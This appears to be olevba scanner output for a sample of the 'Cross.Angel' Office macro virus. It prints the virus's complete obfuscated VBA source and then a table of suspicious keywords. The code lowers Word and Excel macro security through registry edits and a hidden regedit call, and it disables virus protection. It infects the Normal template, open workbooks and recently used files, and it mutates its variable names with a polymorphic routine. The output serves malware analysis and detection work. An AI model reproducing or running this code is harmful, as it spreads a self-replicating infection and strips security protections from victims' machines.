olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across.b-74255330221329a0ac0139c5a1d244012dbc1e7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across.b-74255330221329a0ac0139c5a1d244012dbc1e7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const ž»§–Ê = "' Cross.Angel", …·µ¶Š = 130, ‡š…©® = "9.0", ª’¼¹® = "Macro", »–Šš¦ = "Tools", µžŠª¯ = &H1, µžŠª¯_ = &H0, ¸‡Â”“ = 0, ª¾±³· = 1, „Â©¶° = 12, ·˜¯¨¦ = "excel.application", È‡‰ƒ· = "DieseArbeitsmappe"
If Application.Version = ‡š…©® Then
    Application.CommandBars(ª’¼¹®).Controls((ª¾±³· + ª¾±³· + ª¾±³·)).Enabled = (Rnd * ¸‡Â”“)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = µžŠª¯
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = µžŠª¯_
    Application.CommandBars(»–Šš¦).Controls(„Â©¶°).Enabled = (Rnd * ¸‡Â”“)
    Options.VirusProtection = (Rnd * ¸‡Â”“)
End If
Options.SaveNormalPrompt = (Rnd * ¸‡Â”“)
È¹Ž±¦ = ½‘ˆ²†(ThisDocument.VBProject.VBComponents(ª¾±³·).CodeModule.Lines(ª¾±³·, …·µ¶Š))
If MacroContainer = ActiveDocument Then Set ÈŽ‡Œ” = NormalTemplate Else Set ÈŽ‡Œ” = ActiveDocument
With ÈŽ‡Œ”.VBProject.VBComponents(ª¾±³·).CodeModule
    If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
        .DeleteLines ª¾±³·, .CountOfLines
        .InsertLines ª¾±³·, È¹Ž±¦
        If ÈŽ‡Œ” = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ª¾±³· Then
Set ÈÅ”›² = GetObject(, ·˜¯¨¦)
If ÈÅ”›² = "" Then Set ÈÅ”›² = CreateObject(·˜¯¨¦): ˆŽ£È« = ª¾±³·
If ˆŽ£È« <> ª¾±³· Then
    For Each À˜Êƒˆ In ÈÅ”›².Workbooks
       With À˜Êƒˆ.VBProject.VBComponents(È‡‰ƒ·).CodeModule
            If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                .DeleteLines ª¾±³·, .CountOfLines
                .InsertLines ª¾±³·, È¹Ž±¦
                If À˜Êƒˆ.Path <> "" Then À˜Êƒˆ.Save Else À˜Êƒˆ.SaveAs À˜Êƒˆ.FullName
            End If
        End With
    Next
Else
    For À˜Êƒˆ = ª¾±³· To ÈÅ”›².Application.RecentFiles.Maximum
        ÈÅ”›².Application.RecentFiles(À˜Êƒˆ).Open
            With ÈÅ”›².Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(È‡‰ƒ·).CodeModule
                If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                    .DeleteLines ª¾±³·, .CountOfLines
                    .InsertLines ª¾±³·, È¹Ž±¦
                End If
            End With
        ÈÅ”›².Application.Workbooks(Application.RecentFiles(1).Name).Close ª¾±³·
    Next
    ÈÅ”›².Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ª¾±³·
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ª¾±³· Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ª¾±³·
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const ž»§–Ê = "' Cross.Angel", …·µ¶Š = 130, ‡š…©® = "9.0", ª’¼¹® = "Macro", »–Šš¦ = "Tools", ¸‡Â”“ = 0, ª¾±³· = 1, „Â©¶° = 10, ·˜¯¨¦ = "word.application", È‡‰ƒ· = "DieseArbeitsmappe"
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = ‡š…©® Then
    Application.CommandBars(ª’¼¹®).Controls((ª¾±³· + ª¾±³· + ª¾±³·)).Enabled = (Rnd * ¸‡Â”“)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(»–Šš¦).Controls(„Â©¶°).Enabled = (Rnd * ¸‡Â”“)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
È¹Ž±¦ = ½‘ˆ²†(ThisWorkbook.VBProject.VBComponents(È‡‰ƒ·).CodeModule.Lines(ª¾±³·, …·µ¶Š))
For Each À˜Êƒˆ In Application.Workbooks
    With À˜Êƒˆ.VBProject.VBComponents(È‡‰ƒ·).CodeModule
        If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
            .DeleteLines ª¾±³·, .CountOfLines
            .InsertLines ª¾±³·, È¹Ž±¦
            If À˜Êƒˆ.Path <> "" Then À˜Êƒˆ.Save Else À˜Êƒˆ.SaveAs À˜Êƒˆ.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ª¾±³· Then
    Application.WindowState = xlMinimized
    For À˜Êƒˆ = ª¾±³· To Application.RecentFiles.Maximum
        Application.RecentFiles(À˜Êƒˆ).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(È‡‰ƒ·).CodeModule
                If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
                    .DeleteLines ª¾±³·, .CountOfLines
                    .InsertLines ª¾±³·, È¹Ž±¦
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ª¾±³·
    Next
End If
Set ÈÅ”›² = GetObject(, ·˜¯¨¦)
If ÈÅ”›² = "" Then Set ÈÅ”›² = CreateObject(·˜¯¨¦): ˆŽ£È« = ª¾±³·
If ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ª¾±³· Then ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ª¾±³·
If ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ª¾±³· Then
With ÈÅ”›².NormalTemplate.VBProject.VBComponents(ª¾±³·).CodeModule
    If .Lines(ª¾±³·, ª¾±³·) <> ž»§–Ê Then
        .DeleteLines ª¾±³·, .CountOfLines
        .InsertLines ª¾±³·, È¹Ž±¦
        ÈÅ”›².NormalTemplate.Save
        ÈÅ”›².System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ª¾±³·
    End If
End With
End If
If ˆŽ£È« = ª¾±³· Then ÈÅ”›².Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ½‘ˆ²†(È¹Ž±¦) 'JSMP v1.2
Dim £µŠ‰œ(0 To 20): Randomize
¨¸¸‘Š = 1: £µŠ‰œ(0) = "È¹Ž±¦": £µŠ‰œ(1) = "½‘ˆ²†": £µŠ‰œ(2) = "£µŠ‰œ": £µŠ‰œ(3) = "Š¸¾¯˜": £µŠ‰œ(4) = "£…†Ã�": £µŠ‰œ(5) = "¨¸¸‘Š": £µŠ‰œ(6) = "ž»§–Ê": £µŠ‰œ(7) = "…·µ¶Š": £µŠ‰œ(8) = "‡š…©®": £µŠ‰œ(9) = "ª’¼¹®": £µŠ‰œ(10) = "»–Šš¦": £µŠ‰œ(11) = "µžŠª¯": £µŠ‰œ(12) = "¸‡Â”“": £µŠ‰œ(13) = "ª¾±³·": £µŠ‰œ(14) = "„Â©¶°": £µŠ‰œ(15) = "·˜¯¨¦": £µŠ‰œ(16) = "È‡‰ƒ·": £µŠ‰œ(17) = "ÈŽ‡Œ”": £µŠ‰œ(18) = "ÈÅ”›²": £µŠ‰œ(19) = "ˆŽ£È«": £µŠ‰œ(20) = "À˜Êƒˆ"
For Š¸¾¯˜ = 0 To 20
£…†Ã� = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
¨¸¸‘Š = InStr(¨¸¸‘Š + 1, È¹Ž±¦, £µŠ‰œ(Š¸¾¯˜))
If ¨¸¸‘Š Then È¹Ž±¦ = Mid(È¹Ž±¦, 1, (¨¸¸‘Š - 1)) & £…†Ã� & Mid(È¹Ž±¦, (¨¸¸‘Š + Len(£µŠ‰œ(Š¸¾¯˜))), Len(È¹Ž±¦))
Loop While ¨¸¸‘Š
Next
½‘ˆ²† = È¹Ž±¦
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

